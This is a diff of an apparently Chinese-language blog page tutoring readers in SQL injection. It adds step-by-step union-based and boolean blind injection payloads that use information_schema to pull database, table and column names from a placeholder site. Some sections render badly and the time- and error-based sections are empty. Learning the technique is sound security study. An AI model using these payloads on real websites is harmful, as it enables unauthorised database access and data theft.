@@ -46,15 +46,23 @@
   };
 </script>
 
-  <meta name="description" content="了解SQL注入什么是SQL注入SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 SQL注入的危害攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网">
+  <meta name="description" content="了解SQL注入什么是SQL注入SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 SQL注入的危害攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入">
 <meta property="og:url" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;index.html">
 <meta property="og:site_name" content="Timorblog">
-<meta property="og:description" content="了解SQL注入什么是SQL注入SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 SQL注入的危害攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网">
+<meta property="og:description" content="了解SQL注入什么是SQL注入SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 SQL注入的危害攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;1.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;10.png">
 <meta property="article:published_time" content="2019-12-20T08:28:36.000Z">
-<meta property="article:modified_time" content="2019-12-20T13:35:50.876Z">
+<meta property="article:modified_time" content="2019-12-23T02:33:43.038Z">
 <meta property="article:author" content="Timor">
 <meta property="article:tag" content="Timor">
 <meta property="article:tag" content="渗透测试">
@@ -63,6 +71,7 @@
 <meta property="article:tag" content="提权">
 <meta property="article:tag" content="GETSHELL">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;timorblog.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;1.jpg">
 
 <link rel="canonical" href="https://timorblog.github.io/2019/12/20/SQL%E6%B3%A8%E5%85%A5/">
 
@@ -234,10 +243,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2019-12-20 16:28:36 / 修改时间：21:35:50" itemprop="dateCreated datePublished" datetime="2019-12-20T16:28:36+08:00">2019-12-20</time>
+              <time title="创建时间：2019-12-20 16:28:36" itemprop="dateCreated datePublished" datetime="2019-12-20T16:28:36+08:00">2019-12-20</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-12-23 10:33:43" itemprop="dateModified" datetime="2019-12-23T10:33:43+08:00">2019-12-23</time>
+              </span>
 
           
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -257,7 +272,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="了解SQL注入"><a href="#了解SQL注入" class="headerlink" title="了解SQL注入"></a>了解SQL注入</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+        <img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/1.jpg" class="" title="This is an 1 image">
+<h2 id="了解SQL注入"><a href="#了解SQL注入" class="headerlink" title="了解SQL注入"></a>了解SQL注入</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
 <h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网站用户的数据安全有极大的威胁。攻击者也可以通过获取到的数据，得到后台管理员的密码，然后对网页页面进行恶意篡改。这样不仅对数据库信息安全造成严重威胁，对整个数据库系统安全也影响重大。</p>
 <h3 id="SQL的类型"><a href="#SQL的类型" class="headerlink" title="SQL的类型"></a>SQL的类型</h3><h4 id="按照注入点分类"><a href="#按照注入点分类" class="headerlink" title="按照注入点分类"></a>按照注入点分类</h4><ol>
 <li>数字型注入:无需闭合 多为id?=1 and 1=1 –+</li>
@@ -271,6 +287,7 @@
 <li>联合查询注入:可以使用union查询数据库内容</li>
 <li>堆查询注入:可以同时执行多条语句</li>
 </ul>
+<h4 id="按照数据请求方式来分类"><a href="#按照数据请求方式来分类" class="headerlink" title="按照数据请求方式来分类"></a>按照数据请求方式来分类</h4><p>GET注入：HTTP请求方式为get，注入点一般在get传入的参数部分。<br>POST注入：HTTP请求方式为post，注入点一般为提交的HTML表单，即post传入的数据内容。<br>HTTP头注入：HTTP的请求头存在注入点，例如XFF头，cookie，host这些都是常见的注入点。</p>
 <h2 id="MySQL常用的系统函数"><a href="#MySQL常用的系统函数" class="headerlink" title="MySQL常用的系统函数"></a>MySQL常用的系统函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">version()                     #MySQL版本</span><br><span class="line">user()                        #数据库用户名</span><br><span class="line">database()                    #数据库名</span><br><span class="line">current_user()                #当前用户名</span><br><span class="line">system_user()                 #系统函数名</span><br><span class="line">session_user()                #连接数据库的用户名</span><br><span class="line">@@datadir                     #数据库路径</span><br><span class="line">@@version_compile_os          #操作系统版本</span><br><span class="line">@@basedir                     #数据库安装路径</span><br></pre></td></tr></table></figure>
 <h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询注入利用的前提条件是有<code>显示位</code><br>显示位就是在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位</p>
 <h3 id="联合注入所用函数"><a href="#联合注入所用函数" class="headerlink" title="联合注入所用函数"></a>联合注入所用函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union           #union操作符用于连接两个以上的select语句的结果组合到一个结果集合中</span><br><span class="line">select          #select语句用于从数据库中选取数据</span><br><span class="line">order by        #order by 关键字默认按升序对结果进行排序</span><br><span class="line">group_concat()  #把括号内的值打印在一行,以逗号分隔,以升序排列</span><br><span class="line">from            #从</span><br><span class="line">where           #有条件地从表中选取数据</span><br></pre></td></tr></table></figure>
@@ -287,7 +304,38 @@
 <li>获取字段名</li>
 <li>获取字段中的数据</li>
 </ol>
-<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><h3 id="判断是整型还是字符型"><a href="#判断是整型还是字符型" class="headerlink" title="判断是整型还是字符型"></a>判断是整型还是字符型</h3><h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><h3 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h3><h3 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h3><h3 id="获取数据库所有表名"><a href="#获取数据库所有表名" class="headerlink" title="获取数据库所有表名"></a>获取数据库所有表名</h3><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><h3 id="获取字段中的数据"><a href="#获取字段中的数据" class="headerlink" title="获取字段中的数据"></a>获取字段中的数据</h3>
+<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>例：<a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>可以使用 <code>and 1=1</code> 和<code>and 1=2</code>  根据页面的不同判断（整形判断）</p>
+<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/2.png" class="" title="This is an 2 image">
+<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/3.png" class="" title="This is an 3 image">
+<p>还可以使用 单引号<code>&#39;</code>判断显示数据库错误信息或者页面回显不同（整形字符串类型的判断） </p>
+<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/4.png" class="" title="This is an 4 image">
+<h4 id="判断是整型还是字符型"><a href="#判断是整型还是字符型" class="headerlink" title="判断是整型还是字符型"></a>判断是整型还是字符型</h4><p>输入<code>and 1=1</code>和<code>and 1=2</code>后发现页面变化，判断为整型注入<br>后台代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入&#96;&#39; and 1&#x3D;1 %23&#96;和 &#96;&#39; and 1&#x3D;2%23&#96;后发现页面变化，判断为字符注入</span><br><span class="line">后台代码为：</span><br><span class="line">&#96;&#96;&#96;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<h4 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h4><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数</p>
+<p>输入 <code>order by 4%23</code>  发现页面错误，说明没有4列</p>
+<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/5.png" class="" title="This is an 5 image">
+<p>输入3列时，页面正常，说明有3列</p>
+<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/6.png" class="" title="This is an 6 image">
+<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><p>例 <a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>使union前面的语句报错，执行后面的，爆出显示位，2，3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img 7.png This is an 7 image %&#125;</span><br><span class="line">#### 获取所有数据库名</span><br><span class="line">&#96;&#96;&#96;www.xxx.com&#x2F;view?id&#x3D;-1 union select 1,2,database()</span><br></pre></td></tr></table></figure>
+<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/8.png" class="" title="This is an 8 image">
+<h4 id="获取数据库所有表名"><a href="#获取数据库所有表名" class="headerlink" title="获取数据库所有表名"></a>获取数据库所有表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img 9.png This is an 9 image %&#125;</span><br><span class="line">#### 获取字段名</span><br><span class="line">&#96;&#96;&#96;www.xxx.com&#x2F;view?id&#x3D;-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39;</span><br></pre></td></tr></table></figure>
+<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/10.png" class="" title="This is an 10 image">
+<h4 id="获取字段中的数据"><a href="#获取字段中的数据" class="headerlink" title="获取字段中的数据"></a>获取字段中的数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img 11.png This is an 11 image %&#125;</span><br><span class="line">## 基于布尔的盲注</span><br><span class="line">页面中没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常。</span><br><span class="line">### 布尔盲注所用函数</span><br><span class="line">MYSQL的substr函数的使用</span><br></pre></td></tr></table></figure>
+<p>格式：SUBSTR(string,start,len)<br>含义：从string的start位开始截取len个字符</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MYSQL的<span class="keyword">ascii</span>函数的使用</span><br></pre></td></tr></table></figure>
+<p>格式：ASCII(char)<br>含义：将char转化成ascii码 </p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MYSQL的<span class="built_in">length</span>函数的使用</span><br></pre></td></tr></table></figure>
+<p>格式：length(str)<br>含义：返回str字符串的长度</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### 布尔盲注过程</span><br><span class="line">#### 猜库</span><br><span class="line">##### 猜数据库名的长度</span><br></pre></td></tr></table></figure>
+<p>and length(database())=8  –+</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">##### 猜数据库名的第一个字符</span><br></pre></td></tr></table></figure>
+<p>and ascii(substr(database(),1,1)) = 115 –+<br>猜数据库名的第二个字符就要把substr(database(),2,1)修改</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#### 猜表</span><br><span class="line">##### 猜表的数量</span><br></pre></td></tr></table></figure>
+<p>and(select count(table_name) from information_schema.tables where table_schema = database()) = 4 –+</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">##### 猜表的长度</span><br><span class="line">``` </span><br><span class="line"><span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">6</span> <span class="comment">--+ </span></span><br><span class="line">如果猜第二个表的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h5 id="猜表名的第一个字符"><a href="#猜表名的第一个字符" class="headerlink" title="猜表名的第一个字符"></a>猜表名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))) =<span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">如果猜表名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个表名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><h2 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h2>
     </div>
 
     
@@ -374,7 +422,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#了解SQL注入"><span class="nav-number">1.</span> <span class="nav-text">了解SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入"><span class="nav-number">1.1.</span> <span class="nav-text">什么是SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入的危害"><span class="nav-number">1.2.</span> <span class="nav-text">SQL注入的危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL的类型"><span class="nav-number">1.3.</span> <span class="nav-text">SQL的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#按照注入点分类"><span class="nav-number">1.3.1.</span> <span class="nav-text">按照注入点分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照执行效果来分类"><span class="nav-number">1.3.2.</span> <span class="nav-text">按照执行效果来分类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL常用的系统函数"><span class="nav-number">2.</span> <span class="nav-text">MySQL常用的系统函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合查询注入"><span class="nav-number">3.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#联合注入所用函数"><span class="nav-number">3.1.</span> <span class="nav-text">联合注入所用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-schema数据库说明"><span class="nav-number">3.2.</span> <span class="nav-text">information_schema数据库说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#联合注入的过程"><span class="nav-number">3.3.</span> <span class="nav-text">联合注入的过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断注入点"><span class="nav-number">3.4.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断是整型还是字符型"><span class="nav-number">3.5.</span> <span class="nav-text">判断是整型还是字符型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断查询列数"><span class="nav-number">3.6.</span> <span class="nav-text">判断查询列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断显示位"><span class="nav-number">3.7.</span> <span class="nav-text">判断显示位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取所有数据库名"><span class="nav-number">3.8.</span> <span class="nav-text">获取所有数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据库所有表名"><span class="nav-number">3.9.</span> <span class="nav-text">获取数据库所有表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取字段名"><span class="nav-number">3.10.</span> <span class="nav-text">获取字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取字段中的数据"><span class="nav-number">3.11.</span> <span class="nav-text">获取字段中的数据</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#了解SQL注入"><span class="nav-number">1.</span> <span class="nav-text">了解SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入"><span class="nav-number">1.1.</span> <span class="nav-text">什么是SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入的危害"><span class="nav-number">1.2.</span> <span class="nav-text">SQL注入的危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL的类型"><span class="nav-number">1.3.</span> <span class="nav-text">SQL的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#按照注入点分类"><span class="nav-number">1.3.1.</span> <span class="nav-text">按照注入点分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照执行效果来分类"><span class="nav-number">1.3.2.</span> <span class="nav-text">按照执行效果来分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照数据请求方式来分类"><span class="nav-number">1.3.3.</span> <span class="nav-text">按照数据请求方式来分类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL常用的系统函数"><span class="nav-number">2.</span> <span class="nav-text">MySQL常用的系统函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合查询注入"><span class="nav-number">3.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#联合注入所用函数"><span class="nav-number">3.1.</span> <span class="nav-text">联合注入所用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-schema数据库说明"><span class="nav-number">3.2.</span> <span class="nav-text">information_schema数据库说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#联合注入的过程"><span class="nav-number">3.3.</span> <span class="nav-text">联合注入的过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#判断注入点"><span class="nav-number">3.3.1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断是整型还是字符型"><span class="nav-number">3.3.2.</span> <span class="nav-text">判断是整型还是字符型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断查询列数"><span class="nav-number">3.3.3.</span> <span class="nav-text">判断查询列数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断显示位"><span class="nav-number">3.3.4.</span> <span class="nav-text">判断显示位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取数据库所有表名"><span class="nav-number">3.3.5.</span> <span class="nav-text">获取数据库所有表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取字段中的数据"><span class="nav-number">3.3.6.</span> <span class="nav-text">获取字段中的数据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表名的第一个字符"><span class="nav-number">3.3.6.1.</span> <span class="nav-text">猜表名的第一个字符</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">4.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于错误的注入"><span class="nav-number">5.</span> <span class="nav-text">基于错误的注入</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
